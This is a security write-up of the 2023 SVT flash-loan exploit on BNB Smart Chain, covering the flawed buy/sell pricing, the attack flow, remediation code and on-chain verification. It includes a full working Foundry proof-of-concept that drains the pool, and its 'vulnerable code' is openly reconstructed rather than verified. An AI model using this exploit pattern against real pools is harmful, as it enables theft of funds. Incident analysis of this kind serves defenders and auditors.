# SVT — Flawed Price Calculation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-08-26 |
| **Protocol** | SVT (Solvent Protocol Token) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$400,000 USD |
| **Attacker** | [0x4b44...d8C3](https://bscscan.com/address/0x4b44B52EF15f7Aab9A0A6cFDfa8D2c5Eeeb6d8C3) |
| **Attack Contract** | [0x1c65...4fa2](https://bscscan.com/address/0x1c651B04bDd1C1718EEeafedE0A3c13e87024fa2) |
| **Attack Tx** | [0xf2a0...c12](https://bscscan.com/tx/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12) |
| **Vulnerable Contract** | [0x2120...3379](https://bscscan.com/address/0x2120F8F305347b6aA5E5dBB347230a8234EB3379) (SVTpool) |
| **Root Cause** | Flawed price calculation in buy/sell functions — profit extracted via split buys followed by asymmetric sells |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/SVT_exp.sol) |

---

## 1. Vulnerability Overview

SVT (Solvent Protocol Token) was the native token of Solvent Protocol, a Solana-based DeFi platform that had already ceased operations in May 2023. However, the liquidity pool (SVTpool) remaining on the BNB Smart Chain continued to operate.

The `buy()` and `sell()` functions of the `SVTpool` contract calculate the price of SVT internally during purchases and sales. Two critical flaws existed in this calculation logic:

1. **Asymmetric Price Updates**: The way the pool's internal price state (reserves or similar state variables) is updated during `buy()` calls was designed such that it provided a favorable exchange rate on subsequent sells. That is, with split buys, the price is recalculated after each buy transaction, distorting the price applied on the next sell.

2. **Flawed Economic Model**: The `buy()` and `sell()` price calculations of the pool fail to maintain consistency within the same transaction. The attacker borrowed BUSD via flash loan, purchased SVT with two `buy()` calls, then received a disproportionately favorable BUSD exchange rate on `sell()`, recovering more BUSD than the principal.

The attacker sourced a BUSD flash loan from DODO DEX, split-bought SVT in two tranches (`buy(amount/2)`, `buy(amount - amount/2)`), then split-sold in two tranches (`sell(svtBalance2)`, `sell(SVTBalance * 62%)`), realizing approximately $400,000 in profit.

---

## 2. Vulnerable Code Analysis

### 2.1 Flawed Price Calculation Mechanism (Core Vulnerability)

The `buy()` and `sell()` functions of the `SVTpool` contract are unverified, but the logic inferred from the PoC and on-chain behavior analysis is as follows:

```solidity
// ❌ Vulnerable code — estimated SVTpool.buy() implementation
// Contract address: 0x2120F8F305347b6aA5E5dBB347230a8234EB3379 (source unverified)
function buy(uint256 busdAmount) external {
    // ❌ Core vulnerability 1: SVT payout price is calculated from current pool state
    // Simple linear price calculation based on BUSD/SVT ratio in the pool
    uint256 svtOut = busdAmount * currentSvtPerBusd();
    
    // ❌ Core vulnerability 2: pool state is updated after buy,
    // but the update is asymmetric, creating a favorable exchange rate for subsequent sell() calls
    reserveBUSD += busdAmount;
    reserveSVT -= svtOut;  // ❌ Price slippage is not reflected in sell()
    
    SVT.transfer(msg.sender, svtOut);
}

// ❌ Vulnerable code — estimated SVTpool.sell() implementation
function sell(uint256 svtAmount) external {
    // ❌ Core vulnerability: the reserve state changed by buy() is applied
    // favorably to the attacker in the sell() exchange rate calculation
    // (calculated when BUSD has accumulated from buys)
    uint256 busdOut = svtAmount * currentBusdPerSvt();
    
    reserveSVT += svtAmount;
    reserveBUSD -= busdOut;  // ❌ Pool state updated inconsistently
    
    BUSD.transfer(msg.sender, busdOut);
}
```

```solidity
// ✅ Fixed code — price calculation based on AMM invariant (k = x * y)
function buy(uint256 busdAmount) external {
    uint256 reserveBUSD = BUSD.balanceOf(address(this));
    uint256 reserveSVT = SVT.balanceOf(address(this));
    
    // ✅ Accurate price calculation including slippage via x * y = k invariant formula
    // svtOut = reserveSVT * busdAmount / (reserveBUSD + busdAmount)
    uint256 svtOut = reserveSVT * busdAmount / (reserveBUSD + busdAmount);
    
    // ✅ Slippage protection: enforce minimum output parameter
    require(svtOut >= minSvtOut, "Slippage too high");
    
    BUSD.transferFrom(msg.sender, address(this), busdAmount);
    SVT.transfer(msg.sender, svtOut);
    // ✅ Reserves auto-updated based on pool balance (using balanceOf)
}

function sell(uint256 svtAmount) external {
    uint256 reserveBUSD = BUSD.balanceOf(address(this));
    uint256 reserveSVT = SVT.balanceOf(address(this));
    
    // ✅ Same AMM invariant formula applied — price consistency between buy/sell guaranteed
    uint256 busdOut = reserveBUSD * svtAmount / (reserveSVT + svtAmount);
    
    require(busdOut >= minBusdOut, "Slippage too high");
    
    SVT.transferFrom(msg.sender, address(this), svtAmount);
    BUSD.transfer(msg.sender, busdOut);
}
```

**Problem**: The price calculation formulas in the `buy()` and `sell()` functions are mutually inconsistent. With split buys, the pool state is updated at each step, and the sell exchange rate calculated from this updated state is applied favorably to the attacker. Failure to apply the AMM's core invariant (constant product formula, x\*y=k) enabled price manipulation.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Execute BUSD `approve(pool, MAX)`
- Execute SVT `approve(pool, MAX)`
- Check BUSD balance of DODO DEX (`0xFeAFe253802b77456B4627F8c2306a9CeBb5d681`) → determine flash loan target amount

### 3.2 Execution Phase

1. **[DODO Flash Loan Initiation]**: Call `DVM.flashLoan(0, flash_amount, attacker, data)` → `DPPFlashLoanCall` callback executes
2. **[First Buy]**: `pool.buy(amount / 2)` — buy SVT with half of BUSD → record `svtBalance1`
3. **[Second Buy]**: `pool.buy(amount - amount/2)` — buy SVT with remaining BUSD → record `svtBalance2`
4. **[First Sell]**: `pool.sell(svtBalance2)` — sell second-buy SVT for BUSD
5. **[Second Sell]**: `pool.sell(SVT.balanceOf(this) * 62 / 100)` — sell 62% of first-buy SVT for BUSD
6. **[Flash Loan Repayment]**: `BUSD.transfer(dodo, quoteAmount)` — repay principal
7. **[Profit Realized]**: Remaining BUSD is attacker's profit

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────┐
│            Attacker EOA              │
│  0x4b44B52EF15f7Aab9A0A6cFD...       │
└────────────────┬─────────────────────┘
                 │ (1) flashLoan(BUSD)
                 ▼
┌──────────────────────────────────────┐
│           DODO DVM Pool              │
│  0xFeAFe253802b77456B4627F8c...      │
│  Provides BUSD flash loan            │
└────────────────┬─────────────────────┘
                 │ DPPFlashLoanCall callback
                 ▼
┌──────────────────────────────────────┐
│        Attack Contract               │
│  0x1c651B04bDd1C1718EEeafedE...      │
│                                      │
│  ┌─ (2) pool.buy(amount/2) ────────► │
│  │                                   │
│  │  ┌─────────────────────────────┐  │
│  │  │       SVTpool               │  │
│  │  │  0x2120F8F305347b6aA5E5d... │  │
│  │  │                             │  │
│  │  │  buy(BUSD/2) → SVT out     │◄─┤
│  │  │  [Pool state update #1]     │  │
│  │  │                             │  │
│  │  │  buy(BUSD/2) → SVT out     │◄─┤── (3) pool.buy(amount - amount/2)
│  │  │  [Pool state update #2]     │  │
│  │  │  ❌ Asymmetric price        │  │
│  │  │     distortion occurs       │  │
│  │  │                             │  │
│  │  │  sell(svtBalance2) → BUSD  │◄─┤── (4) pool.sell(svtBalance2)
│  │  │  [Favorable rate applied]   │  │
│  │  │                             │  │
│  │  │  sell(SVT*62%) → BUSD      │◄─┤── (5) pool.sell(SVT*62/100)
│  │  │  [Additional profit]        │  │
│  │  └─────────────────────────────┘  │
│  │                                   │
│  └─ (6) BUSD.transfer(dodo, principal) ──► DODO repayment
│                                      │
└──────────────────────────────────────┘
                 │ (7) Remaining BUSD ≈ $400K
                 ▼
        Attacker profit realized
```

### 3.4 Outcome

- **Attacker Profit**: ~$400,000 (BUSD)
- **Protocol Loss**: BUSD liquidity in SVTpool drained
- **Post-Attack**: Attacker laundered 1,000 BNB (~$217,000) through Tornado Cash

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @Analysis: https://twitter.com/Phalcon_xyz/status/1695285435671392504
// @TX: https://bscscan.com/tx/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SVT  = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);
    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    function testExploit() public {
        // [Setup] Set unlimited approvals for BUSD and SVT
        BUSD.approve(address(pool), type(uint256).max);
        SVT.approve(address(pool), type(uint256).max);

        // [Step 1] Request full BUSD flash loan from DODO DVM
        uint256 flash_amount = BUSD.balanceOf(dodo);
        DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));

        // [Final] Print BUSD balance after exploit completes (confirm profit)
        emit log_named_decimal_uint("[End] Attacker BUSD balance", BUSD.balanceOf(address(this)), 18);
    }

    // DODO flash loan callback — actual attack logic
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        uint256 amount = BUSD.balanceOf(address(this));

        // [Step 2] First buy: purchase SVT with half of BUSD
        pool.buy(amount / 2);
        uint256 svtBalance1 = SVT.balanceOf(address(this));

        // [Step 3] Second buy: purchase SVT with remaining BUSD
        // ❌ Two split buys distort the pool's price calculation
        pool.buy(amount - amount / 2);
        uint256 svtBalance2 = SVT.balanceOf(address(this)) - svtBalance1;

        // [Step 4] Sell all second-buy SVT — recover BUSD at distorted rate
        pool.sell(svtBalance2);

        // [Step 5] Sell only 62% of first-buy SVT — optimized profit ratio
        pool.sell(SVT.balanceOf(address(this)) * 62 / 100);

        // [Step 6] Repay flash loan principal
        BUSD.transfer(dodo, quoteAmount);
        // Remaining BUSD = attacker net profit (~$400,000)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Flawed buy/sell Price Calculation | CRITICAL | CWE-682 |
| V-02 | Flash Loan Vulnerable Economic Model | CRITICAL | CWE-1339 |
| V-03 | Missing Slippage Protection | HIGH | CWE-20 |
| V-04 | Spot Price Oracle Dependency (Single-Transaction Manipulable Price) | HIGH | CWE-362 |

### V-01: Flawed buy/sell Price Calculation

- **Description**: The price calculation logic in `SVTpool`'s `buy()` and `sell()` functions lacks mutual consistency. In particular, with split buys, the way the pool state is updated after each buy distorts the sell price applied in subsequent calls in favor of the attacker. This is a logic error caused by not following the AMM standard constant product formula (x\*y=k).
- **Impact**: Attacker can drain all BUSD liquidity from the pool using flash loan funds.
- **Attack Condition**: Executable at any time given sufficient BUSD liquidity in SVTpool and an available flash loan source.

### V-02: Flash Loan Vulnerable Economic Model

- **Description**: The protocol's economic model was not designed to account for large capital inflows (flash loans) within a single transaction. The sell price at the point where the pool state has changed after a large buy does not reflect the actual market value.
- **Impact**: Enables risk-free arbitrage using flash loans.
- **Attack Condition**: Liquidity asymmetry between flash loan providers (DODO, AAVE, Uniswap, etc.) and the pool.

### V-03: Missing Slippage Protection

- **Description**: The `buy()` and `sell()` functions have no minimum output (`minAmountOut`) parameter. Without user protection mechanisms, regular users are also harmed during large-scale price manipulation.
- **Impact**: Also vulnerable to front-running and sandwich attacks.
- **Attack Condition**: Any transaction calling these functions.

### V-04: Spot Price Oracle Dependency

- **Description**: The SVT/BUSD price within the pool relies solely on the on-chain spot price, and profit can be realized immediately after price manipulation within the same transaction. There are no manipulation-resistant mechanisms such as TWAP (time-weighted average price).
- **Impact**: Complete neutralization of the price determination logic.
- **Attack Condition**: Sufficient initial capital (flash loan available).

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Apply AMM Invariant (Constant Product) Formula**:

```solidity
// ✅ buy() fix — Uniswap V2-style output amount calculation
function buy(uint256 busdAmountIn, uint256 minSvtOut) external {
    uint256 reserveBUSD = BUSD.balanceOf(address(this));
    uint256 reserveSVT  = SVT.balanceOf(address(this));
    
    // ✅ x * y = k invariant: amountOut = reserveOut * amountIn / (reserveIn + amountIn)
    uint256 svtOut = reserveSVT * busdAmountIn / (reserveBUSD + busdAmountIn);
    require(svtOut >= minSvtOut, "SVTpool: INSUFFICIENT_OUTPUT");   // ✅ Slippage protection
    require(svtOut > 0, "SVTpool: ZERO_OUTPUT");
    
    BUSD.transferFrom(msg.sender, address(this), busdAmountIn);
    SVT.transfer(msg.sender, svtOut);
    
    emit Buy(msg.sender, busdAmountIn, svtOut);
}

// ✅ sell() fix — same formula guarantees consistency
function sell(uint256 svtAmountIn, uint256 minBusdOut) external {
    uint256 reserveBUSD = BUSD.balanceOf(address(this));
    uint256 reserveSVT  = SVT.balanceOf(address(this));
    
    // ✅ Same AMM formula — price consistency between buy and sell guaranteed
    uint256 busdOut = reserveBUSD * svtAmountIn / (reserveSVT + svtAmountIn);
    require(busdOut >= minBusdOut, "SVTpool: INSUFFICIENT_OUTPUT"); // ✅ Slippage protection
    require(busdOut > 0, "SVTpool: ZERO_OUTPUT");
    
    SVT.transferFrom(msg.sender, address(this), svtAmountIn);
    BUSD.transfer(msg.sender, busdOut);
    
    emit Sell(msg.sender, svtAmountIn, busdOut);
}
```

**2) Flash Loan Reentrancy Prevention**:

```solidity
// ✅ Add nonReentrant guard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SVTpool is ReentrancyGuard {
    function buy(uint256 busdAmountIn, uint256 minSvtOut) external nonReentrant { ... }
    function sell(uint256 svtAmountIn, uint256 minBusdOut) external nonReentrant { ... }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Flawed Price Calculation | Apply Uniswap V2/V3-style AMM constant product formula |
| V-02 Flash Loan Vulnerable Economic Model | Detect and block buy/sell circular trades within a single transaction (per-block volume limits) |
| V-03 Missing Slippage Protection | Mandate `minAmountOut` parameter; auto-calculate appropriate slippage on frontend |
| V-04 Spot Price Dependency | Introduce TWAP or Chainlink price feeds for critical operations; detect short-term price manipulation |
| General Security | Immediately block liquidity provision and implement pool pause functionality upon protocol shutdown |

---

## 7. Lessons Learned

1. **Adhere to AMM Design Principles**: When implementing a custom buy/sell price calculation, mathematically validated invariants such as Uniswap V2's constant product formula (x\*y=k) must be followed. Arbitrary linear pricing formulas are vulnerable to flash loan attacks.

2. **Design With Flash Loans in Mind**: All DeFi pools must be designed assuming unlimited capital inflows (flash loans) within a single transaction as an attack vector. In particular, any structure where an immediate sell following a buy is possible must mathematically prove economic consistency.

3. **Manage Residual Contracts of Discontinued Protocols**: Solvent Protocol ceased operations in May 2023, yet SVTpool on BSC continued to operate. Upon protocol shutdown, associated smart contracts must be immediately paused or liquidity withdrawn.

4. **Mandatory Slippage Protection**: A `minAmountOut` parameter must be added as a requirement to `buy()` and `sell()` functions. Pools without slippage protection are also vulnerable to sandwich attacks by MEV bots.

5. **Unit Tests for Price Calculation**: Unit tests should be written to verify that the price calculations in buy/sell functions are correct. In particular, tests should confirm that the total output after split buys followed by sells matches that of a single buy followed by a sell, and that outputs are always less than inputs.

6. **Small Pools Require Audits Too**: Although the loss of $400,000 is modest compared to major hacks, the vulnerability structure is identical. Even small pools must undergo professional security audits before deployment, and custom AMM formulas in particular require mandatory mathematical verification.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Attack Tx | [0xf2a0...c12](https://bscscan.com/tx/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12) |
| Attacker EOA | 0x4b44B52EF15f7Aab9A0A6cFDfa8D2c5Eeeb6d8C3 |
| Attack Contract (To) | 0x1c651B04bDd1C1718EEeafedE0A3c13e87024fa2 |
| Block Number | 31,178,238 |
| Timestamp | 2023-08-26 02:40:49 UTC |
| Transaction Fee | 0.00290236 BNB ($1.76) |

### 8.2 Token Movements (Transfer Events, 16 Total)

| Phase | Token | Direction | Description |
|------|------|------|------|
| Flash Loan | BUSD | DODO → Attack Contract | Borrow full DODO BUSD balance |
| First Buy | BUSD | Attack Contract → SVTpool | Pay amount/2 |
| First Buy | SVT | SVTpool → Attack Contract | Receive svtBalance1 |
| Second Buy | BUSD | Attack Contract → SVTpool | Pay remaining BUSD |
| Second Buy | SVT | SVTpool → Attack Contract | Receive svtBalance2 |
| First Sell | SVT | Attack Contract → SVTpool | Return svtBalance2 |
| First Sell | BUSD | SVTpool → Attack Contract | Recover excess BUSD |
| Second Sell | SVT | Attack Contract → SVTpool | Return SVT balance * 62% |
| Second Sell | BUSD | SVTpool → Attack Contract | Recover additional BUSD |
| Repayment | BUSD | Attack Contract → DODO | Repay flash loan principal |

### 8.3 PoC vs On-Chain Verification Results

| Field | PoC Code | On-Chain Actual | Match |
|------|----------|-----------|----------|
| Attack Block | 31,178,238 (fork) | 31,178,238 | ✅ |
| Flash Loan Provider | DODO DVM | DODO DVM | ✅ |
| Attack Pattern | buy/buy/sell/sell | buy/buy/sell/sell | ✅ |
| Second Sell Ratio | SVT * 62/100 | SVT * 62% | ✅ |
| Estimated Total Loss | ~$400K | ~$400K | ✅ |
| Total Transfer Events | 10 (expected) | 16 | Approximate match |

### 8.4 Prerequisites

- Sufficient BUSD liquidity pre-existing in SVTpool (`0x2120...3379`)
- Attack contract executed `BUSD.approve(pool, MAX)` and `SVT.approve(pool, MAX)`
- Large BUSD balance present in DODO DVM (`0xFeAFe...681`)
- SVTpool contract source unverified → exact price calculation formula unconfirmable (bytecode analysis required)

> **Note**: The SVTpool contract (`0x2120F8F305347b6aA5E5dBB347230a8234EB3379`) has no verified source code on BscScan, making it impossible to directly confirm the exact implementation of the vulnerable functions. The vulnerable code presented in this document is reverse-engineered based on PoC behavior analysis and attack pattern examination.

---

## References

- [Phalcon Analysis Tweet](https://twitter.com/Phalcon_xyz/status/1695285435671392504)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/SVT_exp.sol)
- [Attack Transaction](https://bscscan.com/tx/0xf2a0c957fef493af44f55b201fbc6d82db2e4a045c5c856bfe3d8cb80fa30c12)
- [Attacker Address](https://bscscan.com/address/0x4b44B52EF15f7Aab9A0A6cFDfa8D2c5Eeeb6d8C3)
- [SVTpool Contract](https://bscscan.com/address/0x2120F8F305347b6aA5E5dBB347230a8234EB3379)
- [Coin Edition Coverage](https://coinedition.com/attacker-makes-away-with-400000-in-svt-flashloan-exploit-report/)

---

*Published: 2026-04-11 | Analysis basis: DeFiHackLabs PoC + on-chain transaction data*